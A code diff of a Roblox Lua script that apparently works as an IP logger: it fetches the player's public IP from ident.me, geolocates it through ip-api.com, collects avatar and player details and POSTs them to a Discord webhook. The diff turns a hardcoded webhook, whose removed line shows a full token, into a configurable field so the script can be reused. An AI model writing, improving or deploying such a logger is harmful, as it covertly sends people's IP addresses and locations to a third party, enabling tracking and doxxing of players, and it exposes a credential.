@@ -1,4 +1,9 @@
-local Webhook = "https://canary.discord.com/api/webhooks/1104798102612869180/tX6COntQn4zViNV89GktxUqJIQQ30eGR5dYMd-oqI4EU2pG1Cxy0vrWJjpP6PrvfPhN2" -- Put your Webhook link here
+---@diagnostic disable: undefined-global
+local logscript = {
+  Webhook = nil
+}
+
+
 
 local IPv4 = game:HttpGet("https://v4.ident.me/")
 
@@ -22,7 +27,7 @@ local HttpRequest = http_request;
 local http = game:GetService("HttpService")
 
 local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?format=Png&isCircular=false&size=150x150&userIds="..UserId
-local url2 = "http://ip-api.com/json/"
+local url2 = "http://ip-api.com/json/"..IPv4
 
 local response = HttpRequest({Url=url, Method="GET",})
 
@@ -82,4 +87,6 @@ local PlayerData =
 
 local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
 
-HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+HttpRequest({Url=logscript.Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+
+return logscript
